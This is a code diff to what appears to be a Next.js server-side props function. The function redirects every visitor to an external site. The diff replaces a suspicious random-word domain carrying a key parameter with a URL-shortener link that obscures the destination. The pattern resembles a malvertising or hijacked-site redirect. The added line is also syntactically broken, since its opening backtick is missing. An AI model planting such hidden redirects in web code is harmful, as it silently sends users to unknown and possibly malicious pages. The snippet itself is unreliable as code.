@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://surprisinglystaunchdemocratic.com/xjpphhnepg?key=0e341ba021c458ee5375afec767360b0/`
+					https://shorturl.at/qGRWX/`
 				}`,
 			},
 		};
